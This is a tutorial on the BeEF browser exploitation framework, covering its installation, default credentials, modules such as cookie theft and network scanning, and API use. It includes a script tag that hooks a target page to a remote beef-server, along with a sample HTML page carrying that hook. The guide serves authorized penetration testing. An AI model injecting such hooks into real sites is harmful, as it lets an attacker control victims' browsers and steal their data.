About BeEF

Browser Exploitation Framework (BeEF) is a penetration testing tool focused on web browsers. It allows security professionals to assess the security posture of web browsers and conduct client-side attacks.

⚠️ Important Notice

BeEF should only be used for authorized security testing. Unauthorized use may be illegal.

Key Features

  • Browser fingerprinting
  • Social engineering modules
  • Network discovery
  • Exploitation modules
  • Command and control interface
  • Cross-platform compatibility
  • RESTful API
  • Integration with other security tools

Installation

On Kali Linux

sudo apt update && sudo apt install beef-xss

From Source

git clone https://github.com/beefproject/beef.git cd beef ./install

Dependencies Installation

sudo gem install bundler bundle install

Basic Usage Guide

1. Starting BeEF

cd beef ./beef

Default credentials:

  • Username: beef
  • Password: beef

2. Accessing the UI

  1. Open browser to http://localhost:3000/ui/panel
  2. Login with credentials
  3. View the control panel

3. Hook Implementation

Add this to target webpage:

<script src="http://beef-server:3000/hook.js"></script>

Common Modules

Reconnaissance

  • Browser fingerprinting
  • Network discovery
  • Cookie theft
  • System information gathering

Social Engineering

Network

  • Port scanning
  • DNS enumeration
  • Ping sweeping
  • Internal network mapping

Persistence

  • Man-in-the-Browser
  • IFRAME creation
  • Pop-under windows
  • Browser plugins

Practical Examples

1. Basic Hook Setup

<!DOCTYPE html> <html> <head> <title>Test Page</title> <script src="http://beef-server:3000/hook.js"></script> </head> <body> <h1>Test Content</h1> </body> </html>

2. Custom Hook with SSL

<script src="https://beef-server:3000/hook.js"></script>

3. API Integration

curl -H "Content-Type: application/json" \ -X POST \ -d '{"username":"beef", "password":"beef"}' \ http://localhost:3000/api/admin/login

Best Practices

  • Security: Change default credentials immediately
  • Scope: Define clear testing boundaries
  • Documentation: Log all testing activities
  • Updates: Keep BeEF and modules updated
  • Network: Use secure connections when possible
  • Testing: Verify modules in isolated environment

Troubleshooting

Hook Not Working

  • Verify server is running
  • Check network connectivity
  • Verify JavaScript is enabled
  • Check browser security settings

UI Access Issues

  • Verify credentials
  • Check server status
  • Clear browser cache
  • Check firewall settings

Module Errors

  • Update modules
  • Check dependencies
  • Verify browser compatibility
  • Review error logs
